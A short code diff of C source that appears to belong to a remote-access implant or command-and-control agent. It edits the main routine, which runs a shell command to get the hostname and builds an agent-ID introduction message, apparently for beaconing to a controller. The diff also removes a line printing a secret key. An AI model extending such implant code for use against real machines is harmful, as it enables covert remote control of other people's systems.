@@ -30,6 +30,7 @@
 
 #define LEN_MSG 512
 #define LEN_ID 36
+#define INFO_BUFFER 512
 
 /*
  * STRUCT AND NTDLL FUNCTION TYPE DEFINITION
@@ -228,11 +229,12 @@ char* execute(char* command) {
 
 
 int main() {
-    printf("Secret key is: %s\n", SECRETKEY);
     srand(time(NULL));
     
     char agent_id[LEN_ID + 2] = "f0f0f0f0-f0f0-f0f0-f0f0-f0f0f0f0f0f0:";
     char* hostname_h = execute("hostname");
+    char test_Host[INFO_BUFFER];
+    
 
     size_t intro_h_size = LEN_ID + 1 + strlen(hostname_h);  // +1 for ':'
     char* intro_h = malloc(intro_h_size);
